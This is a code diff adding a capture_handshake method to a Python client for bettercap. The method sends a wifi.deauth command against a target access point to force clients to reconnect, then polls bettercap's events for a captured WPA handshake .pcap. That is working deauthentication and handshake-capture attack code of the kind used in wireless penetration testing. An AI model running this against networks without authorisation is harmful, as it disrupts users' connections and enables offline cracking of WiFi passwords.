@@ -4,6 +4,7 @@ import base64
 import json
 import logging
 import random
+import time
 import urllib.error
 import urllib.request
 
@@ -92,6 +93,100 @@ class BettercapClient:
                 "[] until restart. Ensure bettercap is running with the REST "
                 "API enabled at %s.", exc, self._url("/api/session"),
             )
+
+    def capture_handshake(self, bssid, ssid="", timeout=25):
+        """Actively capture a WPA handshake for ``bssid`` and return its .pcap.
+
+        This is what an on-device "capture" action calls: in live mode it
+        focuses recon on the AP's channel, fires a deauth to nudge a client
+        into re-associating, then polls /api/events for a
+        ``wifi.client.handshake`` event whose AP mac matches ``bssid``. On
+        success it returns a best-effort path to the .pcap bettercap wrote
+        (the event's ``file`` field if present, otherwise a path derived from
+        wifi.handshakes.file). Returns None in sim mode or on ANY error.
+
+        NEEDS ON-HARDWARE VALIDATION: bettercap event tags/payload shapes and
+        the handshakes-file layout vary by version, so every access is guarded
+        and the method degrades to None rather than raising.
+        """
+        if self.mode != "live" or self._degraded:
+            return None
+        try:
+            return self._capture_handshake_live(bssid, ssid, timeout)
+        except Exception as exc:  # noqa: BLE001 - never raise out of capture
+            log.warning("bettercap capture_handshake failed (%s); no capture", exc)
+            return None
+
+    def _capture_handshake_live(self, bssid, ssid, timeout):
+        if not bssid:
+            return None
+        target = str(bssid).lower()
+        try:
+            deadline = float(timeout)
+        except (TypeError, ValueError):
+            deadline = 25.0
+
+        # Best-effort: lock recon onto the AP's channel (if we know it from a
+        # prior detection) and deauth the AP to force handshakes. The channel
+        # may be unknown; bettercap tolerates targeting by bssid regardless.
+        channel = self._known_channel(target)
+        cmds = []
+        if channel:
+            cmds.append(f"wifi.recon.channel {channel}")
+        cmds.append(f"wifi.deauth {target}")
+        for cmd in cmds:
+            try:
+                self._request("/api/session", payload={"cmd": cmd})
+            except Exception as exc:  # noqa: BLE001 - keep polling regardless
+                log.debug("bettercap capture cmd %r failed (%s)", cmd, exc)
+
+        end = time.monotonic() + deadline
+        while time.monotonic() < end:
+            try:
+                events = self._request("/api/events") or []
+            except Exception as exc:  # noqa: BLE001
+                log.debug("bettercap capture poll failed (%s)", exc)
+                events = []
+            for ev in events:
+                if not isinstance(ev, dict):
+                    continue
+                tag = str(ev.get("tag", ""))
+                if "handshake" not in tag:
+                    continue
+                data = ev.get("data")
+                if not isinstance(data, dict):
+                    continue
+                ap = data.get("ap") or data.get("bssid") or data.get("mac") or ""
+                if str(ap).lower() != target:
+                    continue
+                path = self._handshake_path(data, target)
+                if path:
+                    return path
+                # handshake seen but no resolvable path -> still a best-effort
+                # signal; return the configured handshakes file if any.
+                return self._handshakes_file() or None
+            time.sleep(0.5)
+        return None
+
+    def _known_channel(self, bssid_lower):
+        """Channel cached from a prior detection, if the agent recorded one."""
+        cache = getattr(self, "_channels", None)
+        if isinstance(cache, dict):
+            return cache.get(bssid_lower)
+        return None
+
+    def _handshake_path(self, data, target):
+        """Resolve a .pcap path from a handshake event payload."""
+        for key in ("file", "path", "pcap", "filename"):
+            val = data.get(key)
+            if val and isinstance(val, str):
+                return val
+        return None
+
+    def _handshakes_file(self):
+        """bettercap's configured wifi.handshakes.file, best-effort."""
+        val = getattr(self.cfg, "handshakes_file", "")
+        return str(val) if val else ""
 
     def poll(self) -> list:
         if self.mode == "sim":
